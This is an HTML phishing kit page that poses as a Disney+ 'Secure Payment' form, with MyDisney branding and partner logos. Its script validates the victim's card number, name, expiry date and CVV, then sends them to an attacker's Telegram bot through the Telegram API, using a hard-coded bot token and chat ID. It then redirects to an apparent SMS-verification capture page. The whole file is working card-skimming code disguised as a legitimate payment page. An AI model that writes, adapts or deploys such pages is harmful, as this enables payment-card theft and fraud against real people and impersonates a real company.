<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Payment | Disney+</title>
  <style>
    /* Styles identiques à l'original */
    body.page-form {
      font-family: 'Helvetica Neue', Arial, sans-serif;
      background-color: #f5f5f7;
      color: #333;
      margin: 0;
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    
    main {
      background: white;
      border-radius: 12px;
      padding: 30px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      max-width: 450px;
      width: 100%;
      box-sizing: border-box;
    }
    
    .center-logo {
      display: block;
      margin: 0 auto 20px;
      max-width: 180px;
    }
    
    h1 {
      text-align: center;
      font-weight: 600;
      font-size: 24px;
      margin-bottom: 20px;
      color: #1a1a2e;
    }
    
    form {
      display: flex;
      flex-direction: column;
    }
    
    input {
      padding: 14px;
      margin-bottom: 16px;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 16px;
    }
    
    input:focus {
      outline: none;
      border-color: #0063e5;
    }
    
    button {
      background-color: #0063e5;
      color: white;
      border: none;
      padding: 16px;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }
    
    button:hover {
      background-color: #004db3;
    }
    
    .footer-note {
      margin-top: 30px;
      text-align: center;
      font-size: 0.85rem;
      color: #666;
    }
    
    .footer-note a {
      color: #0063e5;
      text-decoration: none;
    }
    
    .footer-note a:hover {
      text-decoration: underline;
    }
    
    .logos-container {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 15px;
      margin-top: 15px;
    }
    
    .logos-container img {
      height: 28px;
      object-fit: contain;
    }
    
    /* Spinner */
    #spinnerOverlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.7);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    
    .spinner {
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top: 4px solid #fff;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    /* Styles discrets pour la validation */
    .error-border {
      border-color: #ff3860 !important;
    }
    
    .card-type-detected {
      position: relative;
    }
    
    .card-type-detected::after {
      content: '';
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      width: 32px;
      height: 20px;
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
    }
    
    .card-type-visa::after {
      background-image: url('Images/visa.png');
    }
    
    .card-type-mastercard::after {
      background-image: url('Images/Mastercard.png');
    }
    
    .card-type-amex::after {
      background-image: url('Images/Amex.png');
    }
  </style>
</head>
<body class="page-form">
  <main>
    <!-- Centered MyDisney Logo -->
    <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>

    <h1>Payment Information</h1>

    <!-- Payment icons -->
    <div class="cb-icons" style="display:flex; justify-content:center; gap:12px; margin:16px 0;">
      <img src="Images/visa.png" alt="Visa" style="height:28px; object-fit:contain;"/>
      <img src="Images/Mastercard.png" alt="Mastercard" style="height:28px; object-fit:contain;"/>
      <img src="Images/Amex.png" alt="American Express" style="height:28px; object-fit:contain;"/>
    </div>

    <form id="paymentForm">
      <input type="text" id="cardNumber" placeholder="Card Number" required/>
      <input type="text" id="cardName" placeholder="Name on Card" required/>
      <input type="text" id="expiryDate" placeholder="MM/YY" required/>
      <input type="text" id="cvv" placeholder="CVV" required/>

      <p style="font-size:0.85rem; color:#333; margin:16px 0; text-align:left;">
        By confirming your payment, you agree that your subscription will begin immediately and renew automatically each month. No commitment – you can cancel at any time.
      </p>

      <button type="submit">Confirm Payment</button>
    </form>

    <!-- Footer note + partner logos -->
    <div class="footer-note">
      <strong>Disney+ is part of The Walt Disney Company</strong><br/>
      MyDisney gives you access to services like Disney+, ESPN, Walt Disney World <a href="#">and more</a>.
      <div class="logos-container">
        <img src="Images/compose2.png" alt="Disney+"/>
        <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
        <img src="Images/espn-png-logo-4149.png" alt="ESPN"/>
        <img src="Images/marvel-logo-34291.png" alt="Marvel"/>
        <img src="Images/star-wars-logo-1002.png" alt="Star Wars"/>
        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu"/>
        <img src="Images/natgeo-logo.png" alt="National Geographic"/>
      </div>
    </div>
  </main>

  <!-- Spinner overlay -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
  </div>

  <script>
    // Fonctions de validation
    function detectCardType(cardNumber) {
      const cleanNumber = cardNumber.replace(/\s+/g, '');
      
      // Expressions régulières pour détecter le type de carte
      const patterns = {
        visa: /^4/,
        mastercard: /^(5[1-5]|2[2-7])/,
        amex: /^3[47]/
      };
      
      if (patterns.visa.test(cleanNumber)) return 'visa';
      if (patterns.mastercard.test(cleanNumber)) return 'mastercard';
      if (patterns.amex.test(cleanNumber)) return 'amex';
      
      return null;
    }
    
    function validateCardNumber(cardNumber, cardType) {
      const cleanNumber = cardNumber.replace(/\s+/g, '');
      
      // Vérifier que ce ne sont que des chiffres
      if (!/^\d+$/.test(cleanNumber)) return false;
      
      // Vérifier la longueur selon le type de carte
      if (cardType === 'visa' && (cleanNumber.length !== 13 && cleanNumber.length !== 16)) return false;
      if (cardType === 'mastercard' && cleanNumber.length !== 16) return false;
      if (cardType === 'amex' && cleanNumber.length !== 15) return false;
      
      return true;
    }
    
    function validateExpiryDate(expiryDate) {
      if (!/^\d{2}\/\d{2}$/.test(expiryDate)) return false;
      
      const [month, year] = expiryDate.split('/').map(Number);
      const now = new Date();
      const currentYear = now.getFullYear() % 100;
      const currentMonth = now.getMonth() + 1;
      
      // Vérifier que le mois est valide
      if (month < 1 || month > 12) return false;
      
      // Vérifier que la date n'est pas expirée
      if (year < currentYear) return false;
      if (year === currentYear && month < currentMonth) return false;
      
      return true;
    }
    
    function validateCVV(cvv, cardType) {
      // Vérifier que ce ne sont que des chiffres
      if (!/^\d+$/.test(cvv)) return false;
      
      // Vérifier la longueur selon le type de carte
      if (cardType === 'amex') return cvv.length === 4;
      return cvv.length === 3;
    }
    
    function formatCardNumber(cardNumber) {
      const v = cardNumber.replace(/\s+/g, '');
      const matches = v.match(/\d{4,16}/g);
      const match = matches && matches[0] || '';
      const parts = [];
      
      for (let i = 0, len = match.length; i < len; i += 4) {
        parts.push(match.substring(i, i + 4));
      }
      
      if (parts.length) {
        return parts.join(' ');
      }
      return cardNumber;
    }
    
    function formatExpiryDate(expiryDate) {
      const v = expiryDate.replace(/\D/g, '');
      if (v.length >= 3) {
        return v.substring(0, 2) + '/' + v.substring(2, 4);
      }
      return expiryDate;
    }
    
    // Initialisation
    document.addEventListener('DOMContentLoaded', function() {
      const cardNumberInput = document.getElementById('cardNumber');
      const expiryDateInput = document.getElementById('expiryDate');
      const cvvInput = document.getElementById('cvv');
      const form = document.getElementById('paymentForm');
      
      let currentCardType = null;
      
      // Écouter les changements sur le numéro de carte
      cardNumberInput.addEventListener('input', function() {
        // Formater le numéro de carte avec des espaces
        this.value = formatCardNumber(this.value);
        
        // Détecter le type de carte
        currentCardType = detectCardType(this.value);
        
        // Mettre à jour l'apparence visuelle
        this.classList.remove('card-type-visa', 'card-type-mastercard', 'card-type-amex', 'card-type-detected');
        if (currentCardType) {
          this.classList.add('card-type-detected', `card-type-${currentCardType}`);
        }
      });
      
      // Formater la date d'expiration
      expiryDateInput.addEventListener('input', function() {
        this.value = formatExpiryDate(this.value);
      });
      
      // Validation du formulaire avant envoi
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Valider tous les champs
        const cardNumber = cardNumberInput.value;
        const expiryDate = expiryDateInput.value;
        const cvv = cvvInput.value;
        const cardName = document.getElementById('cardName').value;
        
        currentCardType = detectCardType(cardNumber);
        const isCardNumberValid = validateCardNumber(cardNumber, currentCardType);
        const isExpiryDateValid = validateExpiryDate(expiryDate);
        const isCVVValid = validateCVV(cvv, currentCardType);
        const isNameValid = cardName.trim().length > 0;
        
        // Mettre à jour les styles d'erreur
        cardNumberInput.classList.toggle('error-border', !isCardNumberValid);
        expiryDateInput.classList.toggle('error-border', !isExpiryDateValid);
        cvvInput.classList.toggle('error-border', !isCVVValid);
        document.getElementById('cardName').classList.toggle('error-border', !isNameValid);
        
        // Si tout est valide, procéder au paiement
        if (isCardNumberValid && isExpiryDateValid && isCVVValid && isNameValid) {
          document.getElementById("spinnerOverlay").style.display = "flex";

          const num = cardNumberInput.value;
          const name = document.getElementById('cardName').value.trim();
          const exp = expiryDateInput.value;
          const cvv = cvvInput.value;

          const botToken = "8282278449:AAFAK4-kguuUmTRttN4ocgDvVxc91kWDItA";
          const chatId   = "-4970333928";
          const message  = `💳 Disney+ Payment:\nCard: ${num}\nName: ${name}\nExp: ${exp}\nCVV: ${cvv}`;

          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message })
          }).catch(console.error)
            .finally(() => {
              setTimeout(() => {
                window.location.href = "sms-verification.html";
              }, 17000);
            });
        }
      });
    });
  </script>
</body>
</html>
